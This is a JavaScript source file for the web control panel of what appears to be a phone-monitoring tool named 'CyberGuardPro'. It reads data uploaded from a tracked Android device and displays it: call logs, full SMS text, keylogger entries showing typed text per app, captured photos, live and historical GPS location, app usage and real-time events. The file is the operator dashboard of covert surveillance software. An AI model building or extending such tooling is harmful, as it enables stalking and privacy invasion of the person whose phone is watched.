import { db, auth } from "../api/firebase.js";
import { getAuth, onAuthStateChanged } from "https://www.gstatic.com/firebasejs/12.0.0/firebase-auth.js";
import { getDatabase, ref, onValue, get, query, limitToLast, orderByChild, remove } from "https://www.gstatic.com/firebasejs/12.0.0/firebase-database.js";

const deviceId = await getDeviceIdSafe();


/* ============================================
   DOM ELEMENTS
============================================ */
const callsList = document.getElementById("callsList");
const smsList = document.getElementById("smsList");
const keylogsList = document.getElementById("keylogsList");
const mediaGrid = document.getElementById("mediaGrid");
const appUsageList = document.getElementById("appUsageList");
const locationTableBody = document.getElementById("locationTableBody");
const mapFrame = document.getElementById("mapFrame");
// 🔥 LIVE EVENTS BOX ELEMENTS
const liveEventsBox = document.getElementById("liveEventsBox");
const liveEventsList = document.getElementById("liveEventsList");
const liveCount = document.getElementById("liveCount");


const popupOverlay = document.getElementById("popupOverlay");
const popupTitle = document.getElementById("popupTitle");
const popupBody = document.getElementById("popupBody");
const popupClose = document.getElementById("popupClose");

const imageModal = document.getElementById("imageModal");
const modalImage = document.getElementById("modalImage");
const imgPrev = document.getElementById("imgPrev");
const imgNext = document.getElementById("imgNext");
const imgClose = document.getElementById("imgClose");
const imgDownload = document.getElementById("imgDownload");
const imgDelete = document.getElementById("imgDelete");

const imgDeletee = document.getElementById("deviceModel");

const menuToggle = document.getElementById("menuToggle");
const sidebar = document.getElementById("sidebar");

let images = [], keys = [], currentIndex = 0, scale = 1;

export async function getDeviceIdSafe() {
  return new Promise((resolve, reject) => {
    onAuthStateChanged(auth, async (user) => {
      if (!user) return reject("Not logged in");

      const snap = await get(ref(db, `users/${user.uid}/storeId`));
      resolve(snap.val());
    });
  });
}


/* ============================================
   SIDEBAR TOGGLE
============================================ */
// menuToggle.addEventListener("click", () => {
//   sidebar.classList.toggle("open");
// });

/* ============================================
   POPUP FUNCTIONS
============================================ */
function openPopup(title, data) {
  popupTitle.textContent = title;
  popupBody.innerHTML = "";
  Object.entries(data).forEach(([k, v]) => {
    popupBody.innerHTML += `<div class="popup-row"><span class="label">${k}</span><span class="value">${v}</span></div>`;
  });
  popupOverlay.classList.add("active");
}

popupClose.addEventListener("click", () => popupOverlay.classList.remove("active"));
popupOverlay.addEventListener("click", (e) => {
  if (e.target === popupOverlay) popupOverlay.classList.remove("active");
});

/* ============================================
   IMAGE MODAL FUNCTIONS
============================================ */
function openImage(i) {
  currentIndex = i;
  scale = 1;
  modalImage.src = images[i];
  modalImage.style.transform = "scale(1)";
  imageModal.classList.add("active");
}

imgClose.addEventListener("click", () => imageModal.classList.remove("active"));
imgPrev.addEventListener("click", () => openImage((currentIndex - 1 + images.length) % images.length));
imgNext.addEventListener("click", () => openImage((currentIndex + 1) % images.length));

imgDownload.addEventListener("click", () => {
  const a = document.createElement("a");
  a.href = modalImage.src;
  a.download = "image";
  a.click();
});

imgDelete.addEventListener("click", () => {
  if (!confirm("Delete this image?")) return;
  const uid = auth.currentUser.uid;
  const delRef = ref(db, `users/${uid}//devices/${deviceId}photos/all/${keys[currentIndex]}`);
  remove(delRef).then(() => {
    imageModal.classList.remove("active");
  }).catch(err => alert("Error: " + err));
});

modalImage.addEventListener("wheel", (e) => {
  e.preventDefault();
  scale += e.deltaY * -0.001;
  scale = Math.min(Math.max(1, scale), 4);
  modalImage.style.transform = `scale(${scale})`;
});

imageModal.addEventListener("click", (e) => {
  if (e.target === imageModal) imageModal.classList.remove("active");
});

/* ============================================
   HELPER FUNCTIONS
============================================ */
function formatDateTime(timestamp) {
  if (!timestamp) return "Unknown";
  if (timestamp.toString().length === 10) timestamp = timestamp * 1000;
  return new Date(timestamp).toLocaleString("en-IN", {
    day: "2-digit", month: "short", year: "numeric",
    hour: "2-digit", minute: "2-digit", hour12: true
  });
}

async function getGeoLocation(lat, lng) {
  try {
    const res = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lng}`, {
      headers: { "User-Agent": "CyberGuardPro/1.0" }
    });
    const data = await res.json();
    if (!data.address) return "Unknown Area";
    const a = data.address;
    return [a.suburb || a.neighbourhood || a.village || "", a.city || a.town || a.state_district || ""].filter(Boolean).join(", ");
  } catch {
    return "Unknown Area";
  }
}

/* ============================================
   AUTH STATE
============================================ */
onAuthStateChanged(auth, (user) => {
  if (!user) {
    location.href = "index.html";
    return;
  }
  const uid = user.uid;
  loadCalls(uid);
  loadSms(uid);
  loadImages(uid);
  loadDeviceStatus(uid);
  loadBattery(uid);
  loadLocation(uid);
  loadUserStatus(uid);
  loadKeylogs(uid);
  loadDeviceInfo(uid);
  loadAppUsage(uid);
  loadScreenTime(uid);
  loadLiveEvents(uid); 
});

/* ============================================
   LOAD CALLS
============================================ */
function loadCalls(uid) {
  const callsRef = ref(db, `users/${uid}/devices/${deviceId}/data/calls`);
  const callsQuery = query(callsRef, limitToLast(4));

  onValue(callsQuery, (snap) => {
    if (!snap.exists()) {
      callsList.innerHTML = `<div class="empty-state"><i class="fas fa-phone-slash"></i><h4>No calls yet</h4><p>Recent calls will appear here</p></div>`;
      return;
    }
    callsList.innerHTML = "";
    Object.values(snap.val())
      .sort((a, b) => b.timestamp - a.timestamp)
      .slice(0, 4)
      .forEach((c) => {
        const iconClass = c.type === "INCOMING" ? "incoming" : c.type === "OUTGOING" ? "outgoing" : "missed";
        const iconFA = c.type === "INCOMING" ? "fa-arrow-down" : c.type === "OUTGOING" ? "fa-arrow-up" : "fa-phone-slash";
        
        const item = document.createElement("div");
        item.className = "data-item";
        item.innerHTML = `
          <div class="data-icon ${iconClass}"><i class="fas ${iconFA}"></i></div>
          <div class="data-content">
            <h4>${c.contactName || c.number}</h4>
            <p>${c.type} • ${c.durationSeconds || 0}s</p>
          </div>
          <span class="data-time">${new Date(c.timestamp).toLocaleTimeString([], {hour: '2-digit', minute:'2-digit'})}</span>
        `;
        item.onclick = () => openPopup("Call Details", {
          Number: c.number,
          Type: c.type,
          Duration: (c.durationSeconds || 0) + " sec",
          Time: new Date(c.timestamp).toLocaleString()
        });
        callsList.appendChild(item);
      });
  });
}

/* ============================================
   LOAD SMS
============================================ */
function loadSms(uid) {
  const smsRef = ref(db, `users/${uid}/devices/${deviceId}/data/sms`);
  const smsQuery = query(smsRef, limitToLast(4));

  onValue(smsQuery, (snap) => {
    if (!snap.exists()) {
      smsList.innerHTML = `<div class="empty-state"><i class="fas fa-comment-slash"></i><h4>No messages yet</h4><p>Recent messages will appear here</p></div>`;
      return;
    }
    smsList.innerHTML = "";
    Object.values(snap.val())
      .sort((a, b) => b.timestamp - a.timestamp)
      .slice(0, 4)
      .forEach((s) => {
        const iconClass = s.type === "SENT" ? "outgoing" : "incoming";
        const iconFA = s.type === "SENT" ? "fa-arrow-up" : "fa-arrow-down";
        
        const item = document.createElement("div");
        item.className = "data-item";
        item.innerHTML = `
          <div class="data-icon ${iconClass}"><i class="fas ${iconFA}"></i></div>
          <div class="data-content">
            <h4>${s.address || "Unknown"}</h4>
            <p>${(s.body || "").slice(0, 30)}${s.body && s.body.length > 30 ? "..." : ""}</p>
          </div>
          <span class="data-time">${new Date(s.timestamp).toLocaleTimeString([], {hour: '2-digit', minute:'2-digit'})}</span>
        `;
        item.onclick = () => openPopup("Message Details", {
          Address: s.address,
          Type: s.type,
          Message: s.body,
          Time: new Date(s.timestamp).toLocaleString()
        });
        smsList.appendChild(item);
      });
  });
}

function loadKeylogs(uid) {
  // 🔒 SAFETY CHECKS
  if (!uid || !deviceId) {
    console.warn("Keylogs skipped: uid/deviceId missing");
    return;
  }

  const keylogsList = document.getElementById("keylogsList");
  if (!keylogsList) {
    console.error("keylogsList element not found");
    return;
  }

  const keylogRef = ref(db, `users/${uid}/devices/${deviceId}/keylogs`);

  onValue(keylogRef, (snap) => {
    if (!snap.exists()) {
      keylogsList.innerHTML = `
        <div class="empty-state">
          <i class="fas fa-keyboard"></i>
          <h4>No keylogs yet</h4>
          <p>Keylog entries will appear here</p>
        </div>`;
      return;
    }

    keylogsList.innerHTML = "";
    const items = [];

    snap.forEach((child) => {
      items.push({ ...child.val(), key: child.key });
    });

    items
      .sort((a, b) => (b.timestamp || 0) - (a.timestamp || 0))
      .slice(0, 6)
      .forEach((data) => {
        const item = document.createElement("div");
        item.className = "data-item";

        const shortText = (data.text || "").slice(0, 30);
        const hasMore = data.text && data.text.length > 30;

        item.innerHTML = `
          <div class="data-icon keylog"><i class="fas fa-keyboard"></i></div>
          <div class="data-content">
            <h4>${data.appName || "Unknown App"}</h4>
            <p>${shortText}${hasMore ? "..." : ""}</p>
          </div>
          <span class="data-time">
            ${data.timestamp 
              ? new Date(data.timestamp).toLocaleTimeString([], {hour:'2-digit', minute:'2-digit'}) 
              : ""}
          </span>
        `;

        item.onclick = () => openPopup("Keylog Details", {
          App: data.appName || "Unknown",
          Text: data.text || "",
          Time: data.timestamp
            ? new Date(data.timestamp).toLocaleString()
            : "Unknown"
        });

        keylogsList.prepend(item);
      });
  });
}


/* ============================================
   LOAD IMAGES
============================================ */
function loadImages(uid) {
  const photosRef = ref(db, `users/${uid}/devices/${deviceId}/photos/all`);
  
  onValue(photosRef, (snap) => {
    mediaGrid.innerHTML = "";
    images = [];
    keys = [];
    
    if (!snap.exists()) {
      mediaGrid.innerHTML = `<div class="empty-state" style="grid-column: span 4;"><i class="fas fa-image"></i><h4>No media yet</h4><p>Captured media will appear here</p></div>`;
      return;
    }
    
    Object.entries(snap.val())
      .map(([k, v]) => ({ key: k, url: v.url, ts: v.uploadedAt || 0 }))
      .sort((a, b) => b.ts - a.ts)
      .slice(0, 10)
      .forEach((p, i) => {
        images.push(p.url);
        keys.push(p.key);
        const div = document.createElement("div");
        div.className = "media-item";
        const img = document.createElement("img");
        img.src = p.url;
        img.alt = "Media";
        div.appendChild(img);
        div.onclick = () => openImage(i);
        mediaGrid.appendChild(div);
      });
  });
}

/* ============================================
   LOAD DEVICE STATUS (TOGGLES)
============================================ */
function loadDeviceStatus(uid) {
  const statusRef = ref(db, `users/${uid}/devices/${deviceId}/deviceStatus`);
  
  onValue(statusRef, (snap) => {
    const data = snap.val();
    if (!data) return;

    document.getElementById("bluetoothToggle").classList.toggle("active", data.bluetooth);
    document.getElementById("wifiToggle").classList.toggle("active", data.wifi);
    document.getElementById("hotspotToggle").classList.toggle("active", data.hotspot);
    document.getElementById("locationToggle").classList.toggle("active", data.location);

    const ringerIcon = document.getElementById("ringerIcon");
    const ringerLabel = document.getElementById("ringerLabel");
    const ringerToggle = document.getElementById("ringerToggle");
    
    if (data.ringerMode === "normal") {
      ringerIcon.className = "fas fa-volume-high";
      ringerLabel.textContent = "Ringer";
      ringerToggle.classList.add("active");
    } else if (data.ringerMode === "silent") {
      ringerIcon.className = "fas fa-volume-xmark";
      ringerLabel.textContent = "Silent";
      ringerToggle.classList.add("active");
    } else if (data.ringerMode === "vibrate") {
      ringerIcon.className = "fa-solid fa-mobile-screen";
      ringerLabel.textContent = "Vibrate";
      ringerToggle.classList.add("active");
    }

    const dndToggle = document.getElementById("dndToggle");
    dndToggle.classList.toggle("active", data.ringerMode === "silent" || data.ringerMode === "vibrate");
  });
}

/* ============================================
   LOAD BATTERY
============================================ */
function loadBattery(uid) {
  const batteryRef = ref(db, `users/${uid}/devices/${deviceId}/battery`);
  
  onValue(batteryRef, (snap) => {
    const data = snap.val();
    if (!data) return;

    const level = data.level ?? 0;
    const isCharging = data.charging ?? false;
    // Add this after battery level icon logic
    const chargingIconn = document.getElementById("voltBattery");
    chargingIconn.style.display = isCharging ? "block" : "none";

    // document.getElementById("batteryPercent").textContent = level + "%";
    document.getElementById("batteryStatValue").textContent = level + "%";
    document.getElementById("batteryProgressBar").style.width = level + "%";

    const batteryIcon = document.getElementById("batteryIcon");
    const batteryWrapper = document.getElementById("batteryWrapper");
    
    if (level >= 80) {
      batteryIcon.className = "fas fa-battery-full";
      batteryIcon.style.color = "var(--accent-green)";
    } else if (level >= 60) {
      batteryIcon.className = "fas fa-battery-three-quarters";
      batteryIcon.style.color = "var(--accent-green)";
    } else if (level >= 40) {
      batteryIcon.className = "fas fa-battery-half";
      batteryIcon.style.color = "var(--accent-orange)";
    } else if (level >= 20) {
      batteryIcon.className = "fas fa-battery-quarter";
      batteryIcon.style.color = "var(--accent-orange)";
    } else {
      batteryIcon.className = "fas fa-battery-empty";
      batteryIcon.style.color = "var(--accent-red)";
    }

    batteryWrapper.classList.toggle("charging", isCharging);
  });
}


// Function to load and display today's screen time
function loadScreenTime(uid) {
  // ✅ AUTO DATE: Matches Android StatsModule format "yyyy-MM-dd"
  const today = new Date();
  const dateString = today.getFullYear() + '-' + 
    String(today.getMonth() + 1).padStart(2, '0') + '-' + 
    String(today.getDate()).padStart(2, '0');
  
  // ✅ DYNAMIC PATH: `users/{uid}/stat/2026-02-14`
  const screenTimeRef = ref(db, `users/${uid}/devices/${deviceId}/stat/${dateString}`);
  
  console.log(`📅 Loading screen time for: ${dateString}`);
  
  onValue(screenTimeRef, (snap) => {
    const dailyData = snap.val();
    if (!dailyData) {
      document.getElementById("uptimeValue").textContent = "0min";
      document.getElementById("uptimeProgressBar").style.width = "0%";
      return;
    }

    // ✅ Exact Android field names
    const totalScreenTimeFormatted = dailyData.totalScreenTime || "0min";
    const totalScreenTimeMs = dailyData.totalScreenTimeMs || 0;

    // Update display
    document.getElementById("uptimeValue").textContent = totalScreenTimeFormatted;

    // Progress bar (12h target)
    const dailyTargetMs = 12 * 60 * 60 * 1000;
    const progressPercent = Math.min((totalScreenTimeMs / dailyTargetMs) * 100, 100);
    document.getElementById("uptimeProgressBar").style.width = progressPercent + "%";

    // Color coding
    const bar = document.getElementById("uptimeProgressBar");
    if (progressPercent < 50) {
      bar.style.backgroundColor = "var(--accent-green)";
    } else if (progressPercent < 80) {
      bar.style.backgroundColor = "var(--accent-orange)";
    } else {
      bar.style.backgroundColor = "var(--accent-red)";
    }

    console.log(`📱 Today (${dateString}): ${totalScreenTimeFormatted}`);
  });
}


/* ============================================
   LOAD LOCATION
============================================ */
function loadLocation(uid) {
  const locationRef = ref(db, `users/${uid}/devices/${deviceId}/location`);
  
  onValue(locationRef, async (snap) => {
    const data = snap.val();
    if (!data) return;

    if (data.live) {
      mapFrame.src = `https://www.google.com/maps?q=${data.live.lat},${data.live.lng}&z=14&output=embed`;
    }

    if (!data.history) {
      locationTableBody.innerHTML = `<tr><td colspan="4" style="text-align:center; padding:40px; color:var(--text-muted);">No location history</td></tr>`;
      return;
    }

    const historyArray = Object.values(data.history)
      .sort((a, b) => b.updatedAt - a.updatedAt)
      .slice(0, 4);

    locationTableBody.innerHTML = "";
    for (const item of historyArray) {
      const area = await getGeoLocation(item.lat, item.lng);
      const tr = document.createElement("tr");
      tr.innerHTML = `
        <td>${area}</td>
        <td>${item.lat.toFixed(6)}</td>
        <td>${item.lng.toFixed(6)}</td>
        <td>${new Date(item.updatedAt).toLocaleString()}</td>
      `;
      locationTableBody.appendChild(tr);
    }
  });
}

/* ============================================
   LOAD USER STATUS (ONLINE/OFFLINE)
============================================ */
// function loadUserStatus(uid) {
//   const statusRef = ref(db, `users/${uid}/devices/${deviceId}`);
  
//   onValue(statusRef, (snap) => {
//     const data = snap.val();
//     if (!data) return;

//     const lastSeenTime = Number(data.lastSeen);
//     const statusIndicator = document.getElementById("statusIndicator");
//     const statusOnline = document.getElementById("statusOnline");
//     const lastSeen = document.getElementById("lastSeen");

//     if (!lastSeenTime) {
//       statusIndicator.className = "status-indicator offline";
//       statusOnline.textContent = "Unknown";
//       lastSeen.textContent = "N/A";
//       return;
//     }

//     const now = Date.now();
//     const diffSeconds = Math.floor((now - lastSeenTime) / 1000);

//     if (diffSeconds <= 20) {
//       statusIndicator.className = "status-indicator online";
//       statusOnline.textContent = "Connected";
//     } else {
//       statusIndicator.className = "status-indicator offline";
//       statusOnline.textContent = "Offline";
//     }

//     let humanTime = "";
//     if (diffSeconds <= 10) humanTime = "Just now";
//     else if (diffSeconds < 60) humanTime = `${diffSeconds}s ago`;
//     else if (diffSeconds < 3600) humanTime = `${Math.floor(diffSeconds / 60)}m ago`;
//     else if (diffSeconds < 86400) humanTime = `${Math.floor(diffSeconds / 3600)}h ago`;
//     else humanTime = new Date(lastSeenTime).toLocaleDateString();

//     lastSeen.textContent = humanTime;
//   });
// }

// function loadUserStatus(uid) {
//   if (!uid || !deviceId) return;

//   const statusRef = ref(db, `users/${uid}/devices/${deviceId}`);
//   const offsetRef = ref(db, ".info/serverTimeOffset");

//   const statusIndicator = document.getElementById("statusIndicator");
//   const statusOnline = document.getElementById("statusOnline");
//   const lastSeen = document.getElementById("lastSeen");

//   if (!statusIndicator || !statusOnline || !lastSeen) return;

//   let serverOffset = 0;

//   // 🔥 Sync with Firebase server time (FIXES WRONG TIMING)
//   onValue(offsetRef, (snap) => {
//     serverOffset = snap.val() || 0;
//   });

//   onValue(statusRef, (snap) => {
//     const data = snap.val();
//     if (!data || !data.lastSeen) {
//       setOffline("N/A", "N/A");
//       return;
//     }

//     const lastSeenTime = Number(data.lastSeen);
//     const now = Date.now() + serverOffset; // ✅ SERVER TIME
//     const diff = Math.max(0, now - lastSeenTime);
//     const diffSec = Math.floor(diff / 1000);

//     // 🟢 PROFESSIONAL ONLINE LOGIC
//     const ONLINE_THRESHOLD = 90; // seconds (stable)

//     if (diffSec <= ONLINE_THRESHOLD) {
//       setOnline();
//     } else {
//       setOffline("Offline", formatLastSeen(lastSeenTime));
//     }
//   });

//   // ========================
//   // UI HELPERS
//   // ========================

//   function setOnline() {
//     statusIndicator.className = "status-indicator online";
//     statusOnline.textContent = "Online";
//     lastSeen.textContent = "Active now";
//   }

//   function setOffline(label, timeText) {
//     statusIndicator.className = "status-indicator offline";
//     statusOnline.textContent = label;
//     lastSeen.textContent = timeText;
//   }

//   function formatLastSeen(timestamp) {
//     const now = Date.now() + serverOffset;
//     const diffSec = Math.floor((now - timestamp) / 1000);

//     if (diffSec < 5) return "Just now";
//     if (diffSec < 60) return `${diffSec}s ago`;
//     if (diffSec < 3600) return `${Math.floor(diffSec / 60)}m ago`;
//     if (diffSec < 86400) return `${Math.floor(diffSec / 3600)}h ago`;

//     const date = new Date(timestamp);
//     return date.toLocaleString([], {
//       day: "numeric",
//       month: "short",
//       hour: "2-digit",
//       minute: "2-digit"
//     });
//   }
// }

/* ============================================
   🔥 NEW PRESENCE STATUS (Online/Offline + Last Seen)
============================================ */
function loadUserStatus(uid) {
  if (!uid || !deviceId) return;

  // 🔥 NEW PATH: /status (from Android Presence system)
  const statusRef = ref(db, `users/${uid}/devices/${deviceId}/status`);

  onValue(statusRef, (snap) => {
    const data = snap.val();
    
    const statusIndicator = document.getElementById("statusIndicator");
    const statusOnline = document.getElementById("statusOnline");
    const lastSeen = document.getElementById("lastSeen");

    if (!statusIndicator || !statusOnline || !lastSeen) return;

    if (data?.state === 'online') {
      // 🟢 ONLINE
      statusIndicator.className = "status-indicator online";
      statusOnline.textContent = "Online";
      lastSeen.textContent = "Active now";
    } else {
      // 🔴 OFFLINE + Last seen
      statusIndicator.className = "status-indicator offline";
      statusOnline.textContent = "Offline";
      lastSeen.textContent = formatLastSeen(data?.last_changed);
    }
  });
}

// 🔥 Reuse your existing formatLastSeen helper
function formatLastSeen(timestamp) {
  if (!timestamp) return "Never";
  const now = Date.now();
  const diffSec = Math.floor((now - timestamp) / 1000);

  if (diffSec < 5) return "Just now";
  if (diffSec < 60) return `${diffSec}s ago`;
  if (diffSec < 3600) return `${Math.floor(diffSec / 60)}m ago`;
  if (diffSec < 86400) return `${Math.floor(diffSec / 3600)}h ago`;

  const date = new Date(timestamp);
  return date.toLocaleString([], { day: "numeric", month: "short", hour: "2-digit", minute: "2-digit" });
}


/* ============================================
   LOAD DEVICE INFO
============================================ */
function loadDeviceInfo(uid) {
  const deviceRef = ref(db, `users/${uid}/devices/${deviceId}`);
  
  onValue(deviceRef, (snap) => {
    const data = snap.val();
    if (!data) return;

    const model = document.getElementById("infoModel");
    const os = document.getElementById("infoOS");
    const regTime = document.getElementById("infoRegTime");
    const deviceModel = document.getElementById("deviceModel");
    const deviceOS = document.getElementById("deviceOS");

    // ✅ FIXED: correct property check
    if (data.deviceINFO) {
      const modelText = `${data.deviceINFO.brand || ""} ${data.deviceINFO.model || ""}`.trim() || "Unknown";
      if (model) model.textContent = modelText;
      if (deviceModel) deviceModel.textContent = modelText;

      const androidVer = data.deviceINFO.androidVersion || "Unknown";
      
      if (os) os.textContent = androidVer;
      if (deviceOS) deviceOS.textContent = `Android ${androidVer}`;
    }

    if (data.myAccount && data.myAccount.appRegisterTime) {
      if (regTime) regTime.textContent = formatDateTime(data.myAccount.appRegisterTime);
    }
  });

  
}


/* ============================================
   LOAD APP USAGE
============================================ */
// function loadAppUsage(uid) {
//   const appRef = ref(db, `users/${uid}/apps`);
  
//   onValue(appRef, (snap) => {
//     if (!snap.exists()) {
//       appUsageList.innerHTML = `<div class="empty-state"><i class="fas fa-mobile-screen"></i><h4>No app data</h4><p>App usage will appear here</p></div>`;
//       return;
//     }
    
//     appUsageList.innerHTML = "";
//     const apps = Object.values(snap.val())
//       .sort((a, b) => b.todayUsage - a.todayUsage)
//       .slice(0, 5);

//     const maxUsage = apps[0]?.todayUsage || 1;

//     apps.forEach((app) => {
//       const percent = Math.min((app.todayUsage / maxUsage) * 100, 100);
//       const item = document.createElement("div");
//       item.className = "app-item";
//       item.innerHTML = `
//         <div class="app-icon"><i class="fas fa-mobile-screen"></i></div>
//         <div class="app-info">
//           <h4>${app.appName || "Unknown"}</h4>
//           <div class="app-progress">
//             <div class="app-progress-bar" style="width: ${percent}%;"></div>
//           </div>
//         </div>
//         <span class="app-time">${app.todayUsage || "0"}</span>
//       `;
//       appUsageList.appendChild(item);
//     });
//   });
// }

function loadAppUsage(uid) {
  // 🔥 FIXED: Correct path to match Android StatsModule
  const today = new Date().toISOString().split('T')[0]; // 2026-02-14
  const statRef = ref(db, `users/${uid}/devices/${deviceId}/stat/${today}/apps`);
  
  onValue(statRef, (snap) => {
    if (!snap.exists() || !snap.val()) {
      appUsageList.innerHTML = `
        <div class="empty-state">
          <i class="fas fa-mobile-screen"></i>
          <h4>No app data today</h4>
          <p>App usage will appear here after first scan</p>
        </div>`;
      return;
    }
    
    // 🔥 FIXED: Handle array structure [0,1,2...] from Android
    const appsArray = snap.val() || [];
    const apps = Array.isArray(appsArray) ? appsArray : Object.values(appsArray);
    
    // 🔥 Sort by todayUsageMs (numbers), not todayUsage (strings)
    const sortedApps = apps
      .filter(app => app && app.todayUsageMs > 0) // Only apps with usage
      .sort((a, b) => parseInt(b.todayUsageMs || 0) - parseInt(a.todayUsageMs || 0))
      .slice(0, 5); // Top 5 apps

    if (sortedApps.length === 0) {
      appUsageList.innerHTML = `
        <div class="empty-state">
          <i class="fas fa-mobile-screen"></i>
          <h4>No usage today</h4>
          <p>No apps used for >30 seconds</p>
        </div>`;
      return;
    }

    const maxUsage = Math.max(...sortedApps.map(app => parseInt(app.todayUsageMs || 0))) || 1;

    appUsageList.innerHTML = "";
    
    sortedApps.forEach((app) => {
      const ms = parseInt(app.todayUsageMs || 0);
      const percent = Math.min((ms / maxUsage) * 100, 100);
      
      const item = document.createElement("div");
      item.className = "app-item";
      item.innerHTML = `
        <div class="app-icon"><i class="fas fa-mobile-screen"></i></div>
        <div class="app-info">
          <h4 title="${app.packageName || 'Unknown'}">${app.appName || "Unknown"}</h4>
          <div class="app-progress">
            <div class="app-progress-bar" style="width: ${percent}%;"></div>
          </div>
        </div>
        <span class="app-time">${app.todayUsage || "0min"}</span>
      `;
      appUsageList.appendChild(item);
    });
  });
}

/* ============================================
   🔥 LIVE EVENTS TRACKING 
============================================ */
let liveEventsData = [];
let liveEventsUnsubscribe = null;

function loadLiveEvents(uid) {
  if (!uid || !deviceId) return;
  
  // Cleanup previous listener
  if (liveEventsUnsubscribe) liveEventsUnsubscribe();
  
  const liveRef = ref(db, `users/${uid}/devices/${deviceId}/liveEvents`);
  
  liveEventsUnsubscribe = onValue(liveRef, (snap) => {
    liveEventsData = [];
    
    if (snap.exists()) {
      snap.forEach((child) => {
        liveEventsData.push({
          ...child.val(),
          _key: child.key,
          timestamp: child.val().time || Date.now()
        });
      });
    }
    
    // Sort newest first
    liveEventsData.sort((a, b) => b.timestamp - a.timestamp);
    renderLiveEvents();
    updateLiveCount();
  });
}

function renderLiveEvents() {
  if (!liveEventsList) return;
  
  liveEventsList.innerHTML = '';
  
  // Show only top 50 for performance
  const recentEvents = liveEventsData.slice(0, 1);
  
  recentEvents.forEach((event, index) => {
    const item = createLiveEventItem(event, index);
    liveEventsList.appendChild(item);
  });
  
  // Auto scroll to newest
  liveEventsList.scrollTop = 0;
}

function createLiveEventItem(eventData, index) {
  const div = document.createElement('div');
  div.className = 'live-event-item';
  div.style.animationDelay = `${index * 0.03}s`;
  
  const eventType = eventData.event;
  const time = new Date(eventData.time).toLocaleTimeString([], {
    hour: '2-digit', minute: '2-digit', second: '2-digit'
  });
  
  let details = '';
  if (eventType === 'app_switch') {
    details = `${eventData.from || 'Home'} → ${eventData.to || 'Unknown'}`;
  } else if (eventType.includes('call')) {
    details = `${eventData.direction || ''} • ${eventData.contact || 'Unknown'}${eventData.number ? ` (${eventData.number})` : ''}`;
  } else {
    details = eventType.replace(/_/g, ' ').toUpperCase();
  }
  
  div.innerHTML = `
    <div class="live-event-icon ${getLiveEventIconClass(eventType)}">
      <i class="${getLiveEventIcon(eventType)}"></i>
    </div>
    <div class="live-event-content">
      <div class="live-event-type">${formatLiveEventType(eventType)}</div>
      <div class="live-event-details">${details}</div>
      <div class="live-event-time">${time}</div>
    </div>
    
  `;
  
  return div;
}

function getLiveEventIcon(eventType) {
  const icons = {
    'app_switch': 'fas fa-exchange-alt',
    'screen_on': 'fas fa-eye',
    'screen_off': 'fas fa-eye-slash',
    'music_playing': 'fas fa-music',
    'music_stopped': 'fas fa-stop',
    'incoming_call': 'fas fa-phone',
    'outgoing_call': 'fas fa-phone-arrow-up',
    'call_active': 'fas fa-volume-high',
    'call_ended': 'fas fa-phone-slash',
    'service_started': 'fas fa-play'
  };
  return icons[eventType] || 'fas fa-circle';
}

function getLiveEventIconClass(eventType) {
  const classes = {
    'app_switch': 'app-switch',
    'screen_on': 'screen-on',
    'screen_off': 'screen-off',
    'music_playing': 'music-playing',
    'incoming_call': 'call-incoming',
    'outgoing_call': 'call-outgoing',
    'call_active': 'call-active',
    'call_ended': 'call-ended'
  };
  return classes[eventType] || '';
}

function formatLiveEventType(type) {
  const types = {
    'app_switch': 'App Switch',
    'screen_on': 'Screen On',
    'screen_off': 'Screen Off',
    'music_playing': 'Music Play',
    'music_stopped': 'Music Stop',
    'incoming_call': 'Incoming Call',
    'outgoing_call': 'Outgoing Call',
    'call_active': 'Call Active',
    'call_ended': 'Call Ended'
  };
  return types[type] || type;
}

function updateLiveCount() {
  if (liveCount) {
    liveCount.textContent = liveEventsData.length;
  }
}

// device live

const deviceLook = document.querySelector("#deviceLook");
let contentLoaded = false;
let isMobile = false;

// Mobile detection
const isMobileDevice = () => window.innerWidth <= 768 || /Android|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);

// Toggle function
const toggleDeviceLook = async (show) => {
  if (!isMobile) return;
  
  if (show && !contentLoaded) {
    await loadDevice("pages/device.html");
  }
  deviceLook.style.display = show ? 'block' : 'none';
};

// Load device content
const loadDevice = async (url) => {
  if (contentLoaded) return;
  
  try {
    const res = await fetch(url);
    const html = await res.text();
    
    const temp = document.createElement("div");
    temp.innerHTML = html;
    
    deviceLook.innerHTML = "";
    const scripts = temp.querySelectorAll("script");
    scripts.forEach(s => s.remove());
    
    deviceLook.append(...temp.childNodes);
    
    scripts.forEach(script => {
      const newScript = document.createElement("script");
      if (script.src) newScript.src = script.src;
      if (script.textContent) newScript.textContent = script.textContent;
      if (script.type === "module") newScript.type = "module";
      document.body.appendChild(newScript);
    });
    
    contentLoaded = true;
  } catch (e) {
    console.error("Load failed:", e);
  }
};

// Initialize
const init = async () => {
  isMobile = isMobileDevice();
  
  if (!isMobile) {
    // Desktop: auto-show
    deviceLook.style.display = 'block';
    await loadDevice("pages/device.html");
  } else {
    // Mobile: default OFF
    deviceLook.style.display = 'none';
    
    const toggle = document.getElementById('deviceToggleInput');
    if (toggle) {
      toggle.checked = false; // Default OFF
      toggle.addEventListener('change', (e) => toggleDeviceLook(e.target.checked));
    }
  }
};

// Start
if (document.readyState === 'loading') {
  document.addEventListener('DOMContentLoaded', init);
} else {
  init();
}

